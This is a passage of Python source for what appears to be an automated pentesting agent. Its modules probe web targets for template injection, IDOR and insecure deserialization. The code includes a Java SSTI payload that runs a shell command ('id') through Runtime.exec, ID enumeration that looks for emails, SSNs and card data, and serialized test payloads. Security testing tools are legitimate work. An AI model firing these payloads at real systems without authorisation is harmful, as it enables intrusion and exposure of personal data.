        ("{% set cmd = 'id' %}{% set out = beans['java.lang.Runtime'].getRuntime().exec(cmd).getInputStream() %}{{ out }}", "java"),
    ]

async def _test_ssti_payloads(
    target_url: str, parameter: str, ssti_payloads: List[Tuple[str, str]]
) -> Tuple[List[Dict], bool, Optional[str]]:
    """Test all SSTI payloads"""
    results = []
    vulnerable = False
    detected_engine = None
    timeout_seconds = 30  # Fixed timeout value
    
    async with aiohttp.ClientSession() as session:
        for payload, expected in ssti_payloads:
            result = await _test_single_ssti_payload(session, target_url, parameter, payload, expected, timeout_seconds)
            if result and result.get("vulnerable"):
                vulnerable = True
                detected_engine = result.get("engine")
                results.append(result)
                break
            if result:
                results.append(result)
    
    return results, vulnerable, detected_engine

async def _test_single_ssti_payload(
    session: aiohttp.ClientSession, target_url: str, parameter: str,
    payload: str, expected: str, timeout_seconds: int
) -> Optional[Dict]:
    """Test a single SSTI payload"""
    try:
        from urllib.parse import quote
        encoded_payload = quote(payload)
        test_url = f"{target_url}?{parameter}={encoded_payload}"
        
        async with asyncio.timeout(timeout_seconds):
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=timeout_seconds)) as resp:
                response_text = await resp.text()
                
                if expected in response_text:
                    detected_engine = _detect_template_engine(payload)
                    return {
                        "payload": payload,
                        "expected": expected,
                        "engine": detected_engine,
                        "vulnerable": True
                    }
    except Exception as e:
        logger.debug(f"SSTI test error: {e}")
    return None

def _detect_template_engine(payload: str) -> str:
    """Detect template engine from payload"""
    if "{{" in payload and "config" in payload:
        return "Jinja2"
    elif "${" in payload:
        return "Freemarker/Velocity"
    elif "{php}" in payload:
        return "Smarty"
    elif "<%" in payload:
        return "Mako/ERB"
    return "Unknown"

def _record_ssti_vulnerability(state: "AgentState", target_url: str, detected_engine: Optional[str]) -> None:
    """Record SSTI vulnerability in state"""
    logger.warning(f"SSTI vulnerability found on {target_url} (Engine: {detected_engine})")
    from core.state import VulnerabilityInfo
    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(VulnerabilityInfo(
        vuln_id="SSTI",
        service=service,
        port=port,
        severity="critical",
        exploitable=True
    ))


# -------------------------
# IDOR (Insecure Direct Object Reference)
# -------------------------
async def test_idor(
    state: "AgentState",
    target_url: str,
    parameter: str = "id",
    known_id: int = 1,
    test_ids: List[int] = None
) -> Dict[str, Any]:
    """
    Test for IDOR (Insecure Direct Object Reference) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL with object reference
        parameter: Parameter name containing the ID
        known_id: A known valid ID for baseline
        test_ids: List of IDs to test
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing IDOR on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "idor")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    if test_ids is None:
        test_ids = [0, 1, 2, known_id - 1, known_id + 1, 100, 1000, 9999]
    
    async with aiohttp.ClientSession() as session:
        baseline = await _get_idor_baseline(session, target_url, parameter, known_id)
        if not baseline:
            return {"success": False, "error": "Baseline request failed"}
        
        results, vulnerable, accessible_ids = await _test_idor_ids(
            session, target_url, parameter, test_ids, known_id, baseline
        )
        
        if vulnerable:
            _record_idor_vulnerability(state, target_url)
        
        return {
            "type": "IDOR",
            "target": target_url,
            "vulnerable": vulnerable,
            "accessible_ids": accessible_ids,
            "results": results
        }

async def _get_idor_baseline(session, target_url: str, parameter: str, known_id: int) -> Optional[Dict]:
    """Get baseline response for IDOR testing"""
    baseline_url = f"{target_url}?{parameter}={known_id}"
    timeout_seconds = 30  # Fixed timeout value
    try:
        async with asyncio.timeout(timeout_seconds):
            async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=timeout_seconds)) as resp:
                return {"status": resp.status, "length": len(await resp.text())}
    except Exception as e:
        logger.error(f"Baseline request failed: {e}")
        return None

async def _test_idor_ids(session, target_url: str, parameter: str, test_ids: List[int], 
                         known_id: int, baseline: Dict) -> Tuple[List[Dict], bool, List[int]]:
    """Test each ID for IDOR vulnerability"""
    results = []
    vulnerable = False
    accessible_ids = []
    timeout_seconds = 30  # Fixed timeout value
    
    for test_id in test_ids:
        if test_id == known_id:
            continue
        
        result = await _test_single_idor_id(session, target_url, parameter, test_id, baseline, timeout_seconds)
        if result:
            results.append(result)
            if result.get("vulnerable"):
                vulnerable = True
                accessible_ids.append(test_id)
    
    return results, vulnerable, accessible_ids

async def _test_single_idor_id(session, target_url: str, parameter: str, test_id: int, 
                                baseline: Dict, timeout_seconds: int) -> Optional[Dict]:
    """Test a single ID for IDOR"""
    try:
        test_url = f"{target_url}?{parameter}={test_id}"
        async with asyncio.timeout(timeout_seconds):
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=timeout_seconds)) as resp:
                if resp.status != 200:
                    return None
                
                response_text = await resp.text()
                response_length = len(response_text)
                
                if _is_idor_vulnerable(response_length, baseline["length"]):
                    pattern = _find_sensitive_pattern(response_text)
                    return {
                        "id": test_id,
                        "status": resp.status,
                        "length": response_length,
                        "pattern_found": pattern,
                    "vulnerable": True
                }
    except Exception as e:
        logger.debug(f"IDOR test error for ID {test_id}: {e}")
    return None

def _is_idor_vulnerable(response_length: int, baseline_length: int) -> bool:
    """Check if response indicates IDOR vulnerability"""
    length_diff = abs(response_length - baseline_length)
    return length_diff < baseline_length * 0.5 and response_length > 100

def _find_sensitive_pattern(response_text: str) -> Optional[str]:
    """Find sensitive data patterns in response"""
    import re
    patterns = [
        r'"email":\s*"[^"]+@[^"]+"',
        r'"password"',
        r'"ssn"',
        r'"credit_card"',
        r'"phone":\s*"[0-9]+"',
        r'"address"',
        r'"name":\s*"[^"]+"',
    ]
    for pattern in patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return pattern
    return None

def _record_idor_vulnerability(state: "AgentState", target_url: str) -> None:
    """Record IDOR vulnerability in state"""
    logger.warning(f"IDOR vulnerability found on {target_url}")
    from core.state import VulnerabilityInfo
    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(VulnerabilityInfo(
        vuln_id="IDOR",
        service=service,
        port=port,
        severity="high",
        exploitable=True
    ))


# -------------------------
# Deserialization
# -------------------------
async def test_deserialization(
    state: "AgentState",
    target_url: str,
    parameter: str = "data",
    framework: str = "auto"
) -> Dict[str, Any]:
    """
    Test for insecure deserialization vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL
        parameter: Parameter accepting serialized data
        framework: Target framework (java, php, python, auto)
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing deserialization on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "deserialization")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    payloads = _get_deserialization_payloads()
    frameworks_to_test = [framework] if framework != "auto" else list(payloads.keys())
    
    results, vulnerable, detected_framework = await _test_deserialization_payloads(
        target_url, parameter, payloads, frameworks_to_test
    )
    
    if vulnerable:
        _record_deserialization_vulnerability(state, target_url, detected_framework)
    
    return {
        "type": "DESERIALIZATION",
        "target": target_url,
        "vulnerable": vulnerable,
        "detected_framework": detected_framework,
        "results": results
    }

def _get_deserialization_payloads() -> Dict[str, List[str]]:
    """Get deserialization payloads by framework"""
    return {
        "java": [
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAABYXQAAWJ4",
        ],
        "php": [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;O:8:"stdClass":0:{}}',
        ],
        "python": [
            "gASVCAAAAAAAAACMBHRlc3SULg==",
        ],
        ".net": [
            "/wEPDwUKLTEwNDU5ODU1OQ9kFgICAw9kFgICAQ8PFgIeBFRleHQFDUhlbGxvLCBXb3JsZCFkZGQ=",
        ]
    }

async def _test_deserialization_payloads(
    target_url: str, parameter: str, payloads: Dict[str, List[str]],
    frameworks_to_test: List[str]
) -> Tuple[List[Dict], bool, Optional[str]]:
    """Test deserialization payloads for all frameworks"""
    results = []
    vulnerable = False
    detected_framework = None
    indicators = _get_deserialization_indicators()
    timeout_seconds = 30  # Fixed timeout value
    
    async with aiohttp.ClientSession() as session:
        for fw in frameworks_to_test:
            if fw not in payloads:
                continue
            
            for payload in payloads[fw]:
                result = await _test_single_deserialization_payload(
                    session, target_url, parameter, payload, fw, indicators, timeout_seconds
                )
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        vulnerable = True
                        detected_framework = fw
                        break
            if vulnerable:
                break
    
    return results, vulnerable, detected_framework

def _get_deserialization_indicators() -> List[str]:
    """Get deserialization error indicators"""
    return [
        "java.io.ObjectInputStream",
        "unserialize()",
        "pickle",
        "ClassNotFoundException",
        "InvalidClassException",
        "__wakeup",
        "__destruct",
    ]

async def _test_single_deserialization_payload(
    session: aiohttp.ClientSession, target_url: str, parameter: str,
    payload: str, framework: str, indicators: List[str], timeout_seconds: int
) -> Optional[Dict]:
    """Test a single deserialization payload"""
    try:
        async with asyncio.timeout(timeout_seconds):
            async with session.post(
                target_url,
                data={parameter: payload},
                timeout=aiohttp.ClientTimeout(total=timeout_seconds)
            ) as resp:
                response_text = await resp.text()
                
                for indicator in indicators:
                    if indicator.lower() in response_text.lower():
                        return {
                            "framework": framework,
                            "payload": payload[:50] + "...",
                            "indicator": indicator,
                            "vulnerable": True
                        }
    except Exception as e:
        logger.debug(f"Deserialization test error: {e}")
    return None

def _record_deserialization_vulnerability(state: "AgentState", target_url: str, detected_framework: Optional[str]) -> None:
    """Record deserialization vulnerability in state"""
    logger.warning(f"Deserialization vulnerability found on {target_url} ({detected_framework})")
    from core.state import VulnerabilityInfo
    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(VulnerabilityInfo(
        vuln_id="DESERIALIZATION",
        service=service,
        port=port,
        severity="critical",
        exploitable=True
    ))
